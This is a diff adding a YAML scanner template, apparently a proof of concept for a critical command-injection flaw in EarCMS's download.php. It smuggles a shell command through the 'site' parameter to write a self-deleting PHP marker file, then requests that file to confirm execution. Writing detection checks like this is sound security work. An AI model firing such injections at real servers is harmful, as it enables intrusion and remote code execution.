@@ -1,0 +1,27 @@
+name: yaml-poc-earcms-earcms-other-CT-416446
+binding: c65f77bc-eeb1-464a-b2fb-7e5098be6dd3
+detail:
+    author: system_user
+    vulnerability:
+        id: 74c359f5-d3b2-4e19-b81a-5236a0e8d2c3
+        level: critical
+transport: http
+set:
+    r1: randomInt(40000, 44800)
+    randname: randomLowercase(6)
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /source/pack/127.0.0.1/download.php?site=1%3Becho+%27%3C%3Fphp+echo+md5%28{{r1}}%29%3Bunlink%28__FILE__%29%3B%3F%3E%27+%3E+{{randname}}.php%3B
+            follow_redirects: false
+        expression: response.status == 200
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /source/pack/127.0.0.1/{{randname}}.php
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(r1))))
+expression: r0() && r1()
